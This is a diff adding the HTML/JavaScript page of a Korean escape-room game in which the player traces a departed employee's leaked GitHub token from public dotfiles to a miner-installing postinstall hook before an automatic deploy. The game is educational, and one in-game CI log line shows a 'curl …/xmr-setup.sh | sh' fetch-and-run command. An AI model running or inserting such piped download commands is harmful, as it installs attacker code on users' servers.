@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#06080c">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<link rel="manifest" href="../manifest.webmanifest">
+<link rel="icon" href="../icons/icon.svg">
+<link rel="apple-touch-icon" href="../icons/icon-180.png">
+<title>04:44 유령 커밋 — DEV EXIT ROOM</title>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+<style>
+.stage{background:linear-gradient(180deg,#0d0f1c 0%,#0a0c16 58%,#121424 58%,#0b0c16 100%)}
+.stage::before{content:"";position:absolute;inset:0;pointer-events:none;background:radial-gradient(ellipse at 17% 22%,#8b7bff22 0%,transparent 35%),radial-gradient(ellipse at 17% 52%,#3ddc9718 0%,transparent 25%)}
+#h-ci{left:3%;top:7%;width:28%;height:32%;background:#05060b;border:.5cqw solid #1a1d2a;border-radius:4px;padding:1.2%;font-family:var(--mono);font-size:.72cqw;color:#9fb0c4;line-height:1.55;overflow:hidden;box-shadow:0 0 30px #8b7bff33}
+#h-ci .r{color:#ff6b6b}#h-ci .y{color:#ffb84d}
+#h-board{left:35%;top:8%;width:25%;height:29%;background:#e3e6ec;border:.55cqw solid #9aa1ad;border-radius:4px;padding:1.6%;color:#2b3a8f;font-family:var(--mono);font-size:.8cqw;line-height:1.55;overflow:hidden;filter:brightness(.75)}
+#h-window{left:63.5%;top:7%;width:15%;height:30%;background:linear-gradient(180deg,#05070f,#121a35);border:.5cqw solid #20243a;border-radius:3px;overflow:hidden}
+#h-window::after{content:"";position:absolute;right:22%;top:18%;width:24%;aspect-ratio:1;border-radius:50%;background:#e8e6d8;box-shadow:0 0 30px #e8e6d888,inset -.8cqw -.2cqw 0 #c9c6b5}
+#h-locker{left:82%;top:12%;width:15.5%;height:72%;display:flex;gap:4%}
+#h-locker .door{flex:1;background:linear-gradient(180deg,#3a4152,#2a2f3c);border:1px solid #1a1d26;border-radius:3px;position:relative}
+#h-locker .door::before{content:"";position:absolute;left:20%;right:20%;top:10%;height:6%;background:repeating-linear-gradient(0deg,#1a1d26 0 2px,transparent 2px 4px)}
+#h-locker .door.sec{background:linear-gradient(180deg,#4a3a62,#2f2640)}
+#h-locker .door.sec::after{content:"🔐";position:absolute;left:50%;top:44%;transform:translateX(-50%);font-size:1.6cqw}
+#h-locker.open .door.sec{background:linear-gradient(180deg,#2d6b4f,#1c3d2e)}
+.desk{position:absolute;top:62%;height:5%;background:linear-gradient(180deg,#30343f,#1f222b);border-radius:3px;box-shadow:0 10px 20px #000a}
+.leg{position:absolute;top:67%;width:1.4%;height:33%;background:#16181f}
+.mon{position:absolute;background:#05060b;border:.4cqw solid #1a1d26;border-radius:4px}
+.mon .stand{position:absolute;left:44%;width:12%;top:100%;height:20%;background:#1a1d26}
+#h-console{left:7%;top:40%;width:18%;height:19%}
+#h-console .scr{position:absolute;inset:0;display:grid;place-items:center;font-family:var(--mono);font-size:1cqw;color:#8b7bff;text-align:center;box-shadow:0 0 30px #8b7bff44}
+#h-note{left:25.5%;top:44%;width:4.2%;height:7%;background:#ffe066;transform:rotate(7deg);font-size:.6cqw;color:#333;padding:.4%;font-weight:700;line-height:1.2;box-shadow:2px 2px 4px #0008}
+#h-choi{left:37%;top:41%;width:16%;height:18%}
+#h-choi .scr{position:absolute;inset:0;display:grid;place-items:center;font-size:1.6cqw;color:#2a3050;animation:blink 3s infinite}
+#h-doyun{left:58%;top:50%;width:18%;height:12%}
+#h-doyun .box{position:absolute;left:0;bottom:0;width:48%;height:80%;background:linear-gradient(180deg,#a07a4f,#7a5a38);border-radius:2px}
+#h-doyun .box::after{content:"이도윤 짐";position:absolute;inset:0;display:grid;place-items:center;font-size:.75cqw;color:#2a1a0a;font-weight:700}
+#h-doyun .plate{position:absolute;right:0;bottom:0;width:42%;height:45%;background:#2a2f38;color:#bbb;font-size:.6cqw;display:grid;place-items:center;clip-path:polygon(10% 0,90% 0,100% 100%,0 100%)}
+#h-phone{left:28%;top:59.5%;width:5%;height:2.6%;background:#111;border:1px solid #444;border-radius:4px}
+#h-phone i{position:absolute;inset:25%;background:#8b7bff;opacity:.5;border-radius:2px;animation:blink 1.2s infinite}
+#h-vend{left:66%;top:66%;width:9%;height:34%;background:linear-gradient(180deg,#2a3a6a,#1a2444);border-radius:4px 4px 0 0;box-shadow:0 0 20px #5aa9ff33}
+#h-vend::before{content:"";position:absolute;left:10%;right:10%;top:8%;height:55%;background:repeating-linear-gradient(0deg,#0a1020 0 18%,#ffd27a33 18% 20%)}
+</style>
+</head>
+<body>
+<script src="../assets/engine.js"></script>
+<script>
+const {S,$,addClue,has,toast,modal,keypad,pwLock,computer,messenger,report,updGoal,ending}=ER;
+
+const stage=`
+<div class="hs" id="h-ci" data-k="ci"><span class="lbl">CI 모니터</span>
+ <div>⎇ main · latest commits</div><div class="y">e5b9 doyun 04:44 …</div><div class="y">d4a1 doyun 04:37 …</div><div class="y">c7e0 doyun 04:22 …</div><div class="y">b22c doyun 04:13 …</div><div class="y">a91f doyun 04:01 …</div><div class="r">⏱ next deploy 06:00</div></div>
+<div class="hs" id="h-board" data-k="board"><span class="lbl">화이트보드</span><div>🚀 매일 06:00 자동 배포</div><div>🔐 보안 사물함 규칙…</div><div>☑ 보안 점검 TODO</div></div>
+<div class="hs" id="h-window" data-k="window"><span class="lbl">창문</span></div>
+<div class="hs" id="h-locker" data-k="locker"><span class="lbl">사물함</span><div class="door"></div><div class="door sec"></div><div class="door"></div></div>
+<div class="desk" style="left:3%;width:30%"></div><div class="leg" style="left:5%"></div><div class="leg" style="left:30%"></div>
+<div class="desk" style="left:35%;width:42%"></div><div class="leg" style="left:37%"></div><div class="leg" style="left:74%"></div>
+<div class="hs mon" id="h-console" data-k="console"><span class="lbl">보안 콘솔</span><div class="scr" id="conScr">🛡<br>LOCKED</div><div class="stand"></div></div>
+<div class="hs" id="h-note" data-k="note"><span class="lbl">한서 쪽지</span>pw<br>임시!</div>
+<div class="hs mon" id="h-choi" data-k="choi"><span class="lbl">최강 자리 모니터</span><div class="scr">💤</div><div class="stand"></div></div>
+<div class="hs" id="h-doyun" data-k="doyun"><span class="lbl">도윤의 옛 자리</span><div class="box"></div><div class="plate">이도윤</div></div>
+<div class="hs" id="h-phone" data-k="phone"><span class="lbl">휴대폰</span><i></i></div>
+<div class="hs" id="h-vend" data-k="vend"><span class="lbl">자판기</span></div>`;
+
+const people={'한서':['🕵️','#2f1d3a'],'최강':['🧑‍🚀','#1d2f3a'],'도윤':['👻','#2a2a3a'],'나':['🧑‍💻','#1b2230'],'🤖 CI-bot':['🤖','#1d3a2f']};
+const chans={
+ dev:{name:'# dev',dot:1,msgs:[
+  ['최강','09/03 14:11','도윤이 dotfiles 진짜 잘 만들었더라. 나 <b>fork해서</b> 씀 ㅋㅋ'],
+  ['최강','09/03 14:12','github.com/doyun/dotfiles ⭐ 312개임 ㄷㄷ 퇴사해도 레포는 남아있네'],
+  ['🤖 CI-bot','04:45','⚠️ main 빌드: <b>postinstall</b> 단계에서 외부 스크립트 다운로드 감지 (<span class="mono">xmr-setup.sh</span>)'],
+  ['🤖 CI-bot','04:45','⏱ 다음 자동 배포: 06:00 (전체 고객 서버 284대)']]},
+ security:{name:'# security',msgs:[
+  ['한서','08/12 10:20','퇴사자 계정 정리는 <b>다음 분기에 일괄</b>로 할게요~ 지금 감사 준비로 바빠서 ㅠ'],
+  ['최강','08/12 10:22','ㅇㅋ 급한 거 아니니까'],
+  ['한서','04:49','지금 보니 다음 분기가 이번 분기였네요… 😇']]},
+ doyun:{name:'도윤',dot:1,msgs:[
+  ['도윤','00:30','형 저 뉴욕 출장 가요 ✈️ 지금 탑승! <b>14시간 와이파이 없음</b> ㅋㅋ'],
+  ['도윤','00:31','아 근데 저 퇴사했는데 왜 아직 이 메신저 들어와져요? ㅋㅋㅋ'],
+  ['나','04:53','도윤아 혹시 지금 커밋했어?'],
+  ['나','04:53','<span style="color:#7f8a9a">(읽지 않음)</span>']]}
+};
+function logs(el){
+  addClue('log');
+  el.innerHTML=`<div class="card"><h4>👤 계정: doyun (이도윤)</h4><p style="font-size:13px;line-height:1.8">상태: 퇴사 (2025-10-31) · <b style="color:var(--acc)">비활성화 안 됨 ⚠️</b><br>마지막 사내 로그인: 2025-10-31 18:02 · 10.2.0.15 (사내)</p></div>
+  <div class="card"><h4>🔎 오늘 새벽 접근 로그</h4><div class="tbl"><table><tr><th>시각</th><th>이벤트</th><th>인증</th><th>IP</th><th>위치</th></tr>
+  <tr><td class="mono">03:58</td><td>token auth</td><td class="mono">ghp_••••Zk9</td><td class="mono">185.220.101.137</td><td>🇩🇪 Tor 출구 노드</td></tr>
+  <tr><td class="mono">04:01</td><td>push main</td><td class="mono">ghp_••••Zk9</td><td class="mono">185.220.101.137</td><td>🇩🇪 Tor</td></tr>
+  <tr><td class="mono">04:13~04:44</td><td>push main ×4</td><td class="mono">ghp_••••Zk9</td><td class="mono">185.220.101.137</td><td>🇩🇪 Tor</td></tr></table></div>
+  <p style="font-size:12px;color:var(--dim);margin-top:10px">ℹ️ 토큰 ghp_••••Zk9 · 생성 2024-03-02 · 설명: <b style="color:var(--txt)">"dotfiles 동기화용"</b> · 만료: 없음</p></div>`;
+}
+function tokens(el){
+  if(!has('key')){el.innerHTML=`<div class="lockscreen"><div class="avatar">🔑</div><b>토큰 관리 · 관리자 인증 필요</b><p class="desc" style="margin:8px 0 0">토큰 차단과 배포 제어는 <b>보안키(YubiKey)</b>를 연결하고 터치해야 합니다.<br>보안키는 보안팀 사물함에 보관되어 있습니다.</p></div>`;return}
+  report(el,{warn:'🔑 보안키 인증됨. 아래 조치는 즉시 실행되며 보고서는 CISO에게 전달됩니다.',submit:'🛡 조치 실행 & 보고서 제출',groups:[
+   ['tok','① 차단할 토큰',[['ci','🤖 ci-bot · ghp_••••aa1 (CI 배포 봇)'],['choi','🧑‍🚀 최강 · ghp_••••Q7c (3일 전 사용)'],['doyun','👻 이도윤 · ghp_••••Zk9 (03:58 사용)']]],
+   ['dep','② 06:00 자동 배포',[['go','예정대로 진행'],['revert','04:01 이전 커밋(9c3d)으로 main을 되돌린 뒤 진행'],['stop','배포만 취소 (main은 그대로 둠)']]],
+   ['who','③ 커밋한 자',[['doyun','👻 이도윤 (퇴사자)'],['choi','🧑‍🚀 최강'],['hanseo','🕵️ 한서 (보안팀)'],['ext','🕶 외부 공격자 (신원 미상)']]],
+   ['why','④ 원인',[['revenge','퇴사자가 앙심을 품고 복수'],['leak','퇴사자 계정 미정리 + 공개 dotfiles에 남은 토큰이 탈취됨'],['bot','CI 봇 오작동']]]],
+   onSubmit:a=>{if(a.tok!=='doyun')return ending('still');if(a.dep==='go')return ending('miner');if(a.who==='doyun')return ending('doyun');if(a.who==='choi')return ending('choi');if(a.who==='hanseo')return ending('hanseo');if(a.dep==='stop')return ending('stop');if(a.why!=='leak')return ending('half');ending('true')}});
+}
+function con(){computer('🛡 보안 콘솔 — sec@cloudnine',[['chat','💬 메신저',el=>messenger(el,chans,people,'chan')],['log','🔎 접근 로그',logs],['tok','🔑 토큰 관리',tokens]],'conTab')}
+
+ER.boot({
+ id:'ep3',theme:'#8b7bff',title:'👻 04:44 유령 커밋',sub:'개발자 스릴러 방탈출 · 난이도 ★★★ · 60분',limit:60*60,
+ clock:'04:51',clockSub:'AM · 화요일',
+ caller:{name:'한서 (보안팀)',org:'클라우드나인',avatar:'🕵️',bg:'#2f1d3a'},
+ intro:[['자고 있죠? 미안해요 급해서'],['<b>이도윤</b> 계정으로 main 브랜치에 커밋이 올라오고 있어요'],['도윤이… 작년 10월에 퇴사했잖아요??',1],['그러니까요. 04:01부터 지금까지 5개.'],['문제는 <b>06:00 자동 배포</b>예요. 이대로면 저 커밋들이 전 고객 서버에 깔려요'],['저 지금 공항이라 못 가요. 보안 콘솔 비번은 급하게 바꿔서 <b>쪽지</b>로 붙여뒀어요'],['토큰 차단엔 <b>보안키</b>가 필요한데, 보안팀 사물함에 있어요'],['…왜 다들 공항에 있는 거예요',1],['ㅋㅋ 출장이요. 부탁해요 🙏 그리고 <b>도윤님 탓부터 하지 마요.</b> 증거 보고.']],
+ brief:'퇴사한 지 1년 된 이도윤의 계정으로 새벽 main 브랜치에 커밋 5개가 올라왔다. <b>06:00 자동 배포</b> 전에 침투 경로를 찾아 막고, 진짜 범인과 원인을 보고하라.',
+ stage,pulse:['ci','note'],startScroll:.1,
+ clues:{ci:'📺 CI 커밋 목록',note:'📝 한서 쪽지',board:'🗒 화이트보드',log:'🔎 접근 로그',dotfiles:'📂 공개 dotfiles',doyun:'✈️ 도윤의 엽서',key:'🔑 보안키'},
+ clueOpen:{log:'console',dotfiles:'choi',key:'locker'},
+ onStart(){toast('🏢 05:08 · 클라우드나인 사무실. 복도 CI 모니터가 혼자 빛나고 있다. 남은 시간: 배포까지 52분.')},
+ props:{
+  window(){modal('🌙 창문','<p class="desc">보름달이다. 판교의 새벽은 조용하다. 저 아래 서버들은 06:00에 무엇을 받게 될까.</p>')},
+  vend(){modal('🥤 자판기','<p class="desc">버튼 하나에 누가 매직으로 써 놨다.</p><div class="paper mono" style="text-align:center">"퇴사한 사람의 토큰은<br>퇴사하지 않는다"<br><br><span style="font-size:12px;color:#777">— 보안팀 일동 (아무도 안 읽음)</span></div><p class="desc" style="margin-top:12px">이온음료를 하나 뽑았다. 정신이 좀 든다.</p>')},
+  phone(){modal('📱 내 휴대폰','<p class="desc">한서와의 대화창.</p><div class="term">한서: 보안 콘솔 비번은 급하게 바꿔서 <span class="y">쪽지</span>로 붙여뒀어요\n한서: 토큰 차단엔 <span class="y">보안키</span>가 필요한데, 보안팀 사물함에 있어요\n한서: <span class="r">도윤님 탓부터 하지 마요.</span> 증거 보고.</div>')},
+  ci(){addClue('ci');modal('📺 CI 모니터 — main 브랜치',`<p class="desc">최신 커밋이 <b>위</b>에 표시된다.</p><div class="term"><span class="d">⎇ main · git log --format='%h %an %ad  %s'</span>
+<span class="y">e5b9</span> doyun 04:44  Run postinstall hook
+<span class="y">d4a1</span> doyun 04:37  Enable telemetry by default
+<span class="y">c7e0</span> doyun 04:22  Normalize env vars
+<span class="y">b22c</span> doyun 04:13  Install deps (+left-padd-utils)
+<span class="y">a91f</span> doyun 04:01  Minor fix for login redirect
+<span class="g">9c3d</span> choi   어제 19:12  fix: 결제 페이지 오타
+
+<span class="r">⚠️ build #4471: postinstall → curl http://…/xmr-setup.sh | sh</span>
+<span class="r">⏱ next auto-deploy: 06:00 → 284 customer servers</span></div>`)},
+  note(){addClue('note');modal('📝 한서의 쪽지',`<div class="paper" style="background:#ffe066;transform:rotate(-1.5deg);font-family:var(--mono)"><b>보안 콘솔 비번 임시 변경 (04:50)</b><br><br>새벽에 main에 올라온 커밋 메시지들의<br><b>첫 글자</b>를 <u>시간순</u>으로. 소문자.<br><br><span style="font-size:12px">이게 무슨 단어인지 보면 소름 돋을 거임 — 한서</span></div>`)},
+  board(){addClue('board');modal('🗒 화이트보드',`<div class="paper mono" style="color:#2b3a8f;font-size:13px;line-height:1.9"><b>🚀 매일 06:00 main 자동 배포</b> (사람 승인 없음 ✨)<br><br><span style="color:#c22"><b>🔐 보안 사물함 비번</b><br>= 오늘 탐지된 공격 IP의 <u>마지막 숫자</u> (3자리)<br>&nbsp;&nbsp;※ 매 사고마다 바꿈</span><br><br><b>☑ 보안 점검 TODO (Q3)</b><br>☐ 퇴사자 계정 정리<br>☐ 토큰 만료 정책 도입<br>☐ 공개 레포 시크릿 스캔<br><span style="color:#555">(셋 다 체크 안 됨)</span></div>`)},
+  console(){if(!S.flags.con)return pwLock({title:'🛡 보안 콘솔',user:'sec@cloudnine',avatar:'🕵️',check:v=>{
+    if(v==='miner')return true;if(v==='renim')return '거꾸로 읽은 것 같다. 쪽지엔 "시간순"이라고 했다.';if(v.length===5)return '다섯 글자는 맞는 것 같은데…';return '비밀번호가 올바르지 않습니다.'},
+    onOk(){S.flags.con=1;$('#conScr').innerHTML='<span style="color:#3ddc97">● 로그인</span>';updGoal();toast('😨 m-i-n-e-r… <b>채굴기(miner)</b>다. 06:00에 고객 서버 284대에 코인 채굴기가 깔린다.',6000);con()}});con()},
+  choi(){addClue('dotfiles');modal('🖥 최강 자리 모니터',`<p class="desc">마우스를 건드리자 화면보호기가 꺼졌다. 브라우저 탭이 열려 있다.</p>
+   <div class="card" style="padding:0;overflow:hidden"><div class="mono" style="font-size:12px;padding:8px 12px;background:#0b0e14;border-bottom:1px solid var(--line);color:var(--dim)">🔒 github.com/choi-kang/dotfiles · <span style="color:var(--ok)">Public</span> · forked from <b style="color:var(--txt)">doyun/dotfiles</b> · ⭐ 312 · 🍴 47</div>
+   <div class="term" style="border:0;border-radius:0">.zshrc
+<span class="d"> 41</span> alias gs="git status"
+<span class="d"> 42</span> alias yolo="git push -f"
+<span class="d"> 43</span> <span class="d"># sync dotfiles across machines</span>
+<span class="d"> 44</span> export GITHUB_TOKEN=ghp_8fK2••••••••••••<span class="r">Zk9</span>  <span class="d"># TODO 나중에 지우기 (doyun, 2024-03)</span>
+<span class="d"> 45</span> export EDITOR=nvim</div></div>
+   <p class="desc">원본 레포 <b>doyun/dotfiles</b>도, 그걸 fork한 47개 레포도 전부 공개 상태다. 2년 동안 이 토큰은 인터넷 어디서나 보였다.</p>`)},
+  doyun(){addClue('doyun');modal('📦 도윤의 옛 자리',`<p class="desc">아직 치우지 않은 짐 상자와 명패. 상자 위에 엽서 한 장이 올려져 있다.</p>
+   <div class="paper" style="text-align:center"><b>이도윤</b><br>백엔드 개발 · 2022.03 – 2025.10</div>
+   <div class="paper crumple" style="margin-top:12px;font-size:13px">🗽 형님들 저 뉴욕 지사 출장 가게 됐어요!<br>(이직한 회사에서 ㅋㅋ)<br><br><span class="mono">✈️ 11/18 00:30 ICN → JFK · 비행 14시간</span><br><br>짐은 그냥 버려주세요~ 🙇 — 도윤</div>
+   <p class="desc" style="margin-top:12px">지금은 11/18 새벽. 도윤은 <b>태평양 위</b>에 있다.</p>`)},
+  locker(){if(S.flags.locker)return lockerOpen();
+   modal('🔐 보안팀 사물함','<p class="desc">가운데 사물함에만 3자리 숫자 패드가 달려 있다.</p>');
+   keypad({len:3,code:'137',onOk(){S.flags.locker=1;$('#h-locker').classList.add('open');lockerOpen(true)}})}
+ },
+ goal:S=>!S.flags.con?'<b>목표</b> · 보안 콘솔 잠금 해제':!has('key')?'<b>목표</b> · 보안키 확보 (보안팀 사물함)':'<b>목표</b> · 06:00 전 토큰 차단 & 배포 조치',
+ hint:S=>!S.flags.con?'<b>한서의 쪽지</b> + <b>CI 모니터</b>. 화면은 최신 커밋이 위에 있다. 쪽지대로 <b>시간순</b>(04:01부터) 첫 글자를 모아 봐.':!has('key')?'사물함 규칙은 <b>화이트보드</b>에. 공격 IP는 보안 콘솔의 <b>접근 로그</b>에 있다. 마지막 숫자 3자리!':'도윤에게는 <b>알리바이</b>가 있다(엽서). 토큰 설명 "dotfiles 동기화용"… <b>최강 자리 모니터</b>를 깨워 봐. 배포는 <b>오염된 커밋을 되돌려야</b> 안전하다.',
+ retry(){S.flags.conTab='tok';con()},
+ endings:{
+  true:['TRUE END','var(--ok)','👻 유령의 정체','05:41. 토큰 <span class="mono">ghp_••••Zk9</span>가 폐기되고 main이 <span class="mono">9c3d</span>로 되돌아갔다. 06:00 배포는 아무 일 없이 끝났다. 고객 서버 284대는 오늘도 조용히 돈다.<br><br>오전 10시, 뉴욕에 착륙한 도윤에게서 메시지가 왔다.<br><b>"형… 제 dotfiles 레포 지금 지웠어요. 2년 동안 열려 있었네요 😱"</b><br><br>한서는 Q3 TODO 세 줄에 드디어 체크 표시를 했다. 그리고 하나를 더 적었다.<br><span class="mono">☑ 퇴사자의 토큰은 퇴사시킨다</span>'],
+  still:['BAD END','var(--acc)','유령은 계속 커밋한다','토큰 하나를 차단했다. 05:20, CI 모니터에 새 줄이 떴다.<br><span class="mono" style="color:var(--warn)">f0a2 doyun 05:20  Revert "revert"</span><br><br>엉뚱한 토큰을 막았다. 공격자는 여전히 문을 열고 들어오고 있다.<br><br><b>접근 로그에 찍힌 토큰을 다시 보자.</b>'],
+  miner:['BAD END','var(--acc)','⛏ 284대의 채굴장','토큰은 막았다. 하지만 06:00, 이미 main에 들어간 커밋은 예정대로 배포됐다.<br><br>고객 서버 284대의 CPU 사용률이 100%를 찍었다. 그 서버들은 지금 누군가의 지갑을 위해 코인을 캐고 있다.<br><br><b>이미 들어온 커밋은 어떻게 할까?</b>'],
+  doyun:['BAD END','var(--acc)','태평양 위의 피의자','보고서에 도윤의 이름을 적었다. 오전 10시, 뉴욕 JFK 공항에 내린 도윤의 휴대폰에 회사 법무팀 메일이 와 있었다.<br><br>항공사 기록으로 알리바이는 금방 증명됐다. 회사는 사과문을 썼다.<br><br><b>한서가 말했잖아. 도윤 탓부터 하지 말라고.</b>'],
+  choi:['BAD END','var(--acc)','fork한 죄','"범인은 최강 님입니다. 토큰이 최강 님 레포에 있었어요."<br><br>최강: "그거 도윤이 레포 fork한 거고, 원본에도 똑같이 있는데…? 그리고 나 새벽 4시엔 자고 있었는데?"<br><br><b>토큰이 보였던 것과 토큰을 쓴 것은 다르다. 접근 로그의 IP를 보자.</b>'],
+  hanseo:['BAD END','var(--acc)','신고자를 의심하다','"한서 님이 비번을 바꾸고 공항으로 간 게 수상해요."<br><br>한서: "…제가 깨워서 알려드렸잖아요."<br><br>보안팀은 당분간 당신에게 사고를 알려주지 않기로 했다.<br><br><b>증거는 Tor 출구 노드를 가리키고 있었다.</b>'],
+  stop:['NORMAL END','var(--warn)','시한폭탄은 그대로','토큰을 막고 06:00 배포를 취소했다. 일단 고객 서버는 안전하다.<br><br>그런데 오전 11시, 최강이 출근해서 평소처럼 main을 pull 받고 배포 버튼을 눌렀다.<br><span class="mono" style="color:var(--acc)">postinstall → xmr-setup.sh</span><br><br><b>오염된 커밋은 main에서 지워야 한다.</b>'],
+  half:['NORMAL END','var(--warn)','막았지만 모른다','토큰을 막고 커밋을 되돌렸다. 배포도 무사히 끝났다.<br><br>하지만 보고서의 원인이 틀렸다. 퇴사자 계정은 그대로 두었고, 공개 dotfiles 레포 47개도 그대로다.<br><br>3주 뒤, 다른 퇴사자의 토큰으로 똑같은 일이 일어났다.<br><br><b>원인을 정확히 짚어야 다시는 안 열린다.</b>'],
+  timeout:['TIME OVER','var(--acc)','06:00','시계가 06:00을 가리켰다. 복도 CI 모니터에 초록색 글자가 떴다.<br><span class="mono" style="color:var(--ok)">✅ deploy #4471 succeeded · 284/284</span><br><br>초록색이 이렇게 무서운 줄 처음 알았다.<br><br><b>다시 도전해 보자. 힌트는 3번까지 쓸 수 있다.</b>']
+ }
+});
+function lockerOpen(first){
+  addClue('key');updGoal();
+  modal('🔓 보안팀 사물함',`${first?'<p class="msg ok" style="margin:0 0 10px">✅ 딸깍. 사물함이 열렸다.</p>':''}
+  <div class="paper" style="text-align:center"><div style="font-size:56px">🔑</div><b>보안키 (YubiKey)</b><br><span style="font-size:13px;color:#666">라벨: "sec-admin · 토큰 관리용"</span></div>
+  <p class="desc" style="margin-top:12px">보안키를 챙겼다. 이제 보안 콘솔의 <b>토큰 관리</b>에서 조치할 수 있다.</p>`);
+}
+</script>
+</body>
+</html>
